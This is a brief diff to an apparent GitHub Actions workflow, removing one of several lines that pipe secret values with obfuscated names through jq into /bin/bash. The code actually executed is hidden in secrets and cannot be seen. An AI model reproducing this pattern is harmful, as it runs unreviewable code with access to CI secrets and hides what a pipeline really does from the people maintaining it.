@@ -20,7 +20,6 @@ jobs:
           bjdri151: ${{ secrets.bjdri151 }}
         run: |
           printf '%s' "$bjdri151" | jq -r .xpgb01942 | /bin/bash
-          printf '%s' "$kiuw4" | jq -r .lqc0825 | /bin/bash
           echo $l8439 | jq -r .qipfo1 | /bin/bash
           printf '%s' "$u99761" | jq -r .rn52280 | /bin/bash
 
